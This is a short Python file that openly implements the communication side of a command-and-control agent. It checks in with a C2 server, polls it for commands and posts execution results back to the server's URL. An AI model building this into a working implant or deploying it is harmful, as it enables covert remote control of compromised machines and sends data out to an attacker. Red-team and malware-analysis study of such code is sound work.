import requests
import json

def check_in(config):
    # Send a check-in request to C2
    data = {"agent_id": config["agent_id"]}
    requests.post(config["c2_url"] + "checkin", json=data)

def receive_command(config):
    # Poll C2 for commands
    response = requests.get(config["c2_url"] + "get_command", params={"agent_id": config["agent_id"]})
    if response.status_code == 200:
        command = response.json()
        return command
    return None

def send_result(config, result):
    # Send command execution result to C2
    data = {"agent_id": config["agent_id"], "result": result}
    requests.post(config["c2_url"] + "send_result", json=data)
